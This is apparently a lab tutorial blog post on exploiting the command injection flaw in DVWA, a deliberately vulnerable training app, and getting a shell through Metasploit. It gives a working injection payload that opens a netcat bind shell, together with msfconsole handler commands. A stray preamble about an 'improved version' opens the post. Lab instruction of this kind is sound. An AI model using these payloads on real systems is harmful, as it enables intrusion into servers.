---
layout: post
section-type: post
title: "Exploiting Command Injection Vulnerability in DVWA with Metasploit"
category: tech
tags: ["security", "redteam", "dvwa"]
---

The current post describes the process of exploiting command injection
vulnerability in [DVWA]({% post_url 2017-04-02-dvwa-kali %}), and gaining access
to the server using [Metasploit](https://www.metasploit.com/). While the post
provides a step-by-step guide to the process, it could benefit from some
improvements in terms of clarity and accuracy. Here is an improved version of
the post:

Command Injection is a type of vulnerability that allows attackers to execute
arbitrary commands on the host operating system by manipulating a vulnerable
software. This type of attack is possible when the application fails to properly
validate user input and uses it to execute shell commands on the host operating
system. In this post, we will explore the Command Injection section of DVWA and
demonstrate how to use Metasploit to gain access to the server.

To begin, we need to navigate to the _Command Injection_ section of DVWA, which
is designed to ping an IP address. Let's test the section by entering the IP
address `127.0.0.1` and observing the result.

![ci-1](/img/posts/ci/ci-1.png)

As we can see, the Command Injection section simply appends our input to the
underlying bash command. This means that we can use the input field to execute
arbitrary commands on the host operating system.

Let's try appending a list bash command after our input IP address:

```bash
127.0.0.1; ls
```

![ci-2](/img/posts/ci/ci-2.png)

As expected, the Command Injection section executes the appended command and
displays the result. This confirms that we can use this vulnerability to execute
arbitrary commands on the host operating system.

ow, let's create a backdoor on the server by listening on port `4444` using
netcat and redirecting all the incoming bytes to a bash shell:

```bash
127.0.0.1; mkfifo /tmp/pipe ; sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe
```

![ci-3](/img/posts/ci/ci-3.png)

As you can see, the page is loading forever, which means that our backdoor is
open and waiting for us.

Next, let's use Metasploit to gain access to the server. We will start
msfconsole and use the `exploit/multi/handler` module to open a shell on the
server:

```bash
⁠⁠⁠msfconsole
use exploit/multi/handler
set payload linux/x64/shell/bind_tcp
set RHOST 127.0.0.1
exploit
```

![ci-4](/img/posts/ci/ci-4.png)

Note that we didn't set the LPORT of bind_tcp, since the default one is `4444`.

As you can see, we are logged in as the `www-data` user, which has limited
privileges. We can't read the `/etc/shadow` file, which contains the user
passwords of the operating system. However, we have all the privileges that the
`www-data` user has and we can potentially modify DVWA or escalate to root by
exploiting a local privilege escalation vulnerability.

In conclusion, Command Injection is a serious vulnerability that can allow
attackers to execute arbitrary commands on the host operating system. It is
important for developers to properly validate user input and avoid using it to
execute shell commands. By following the steps outlined in this post, we have
demonstrated how to exploit a Command Injection vulnerability in DVWA and gain
access to the server using Metasploit.
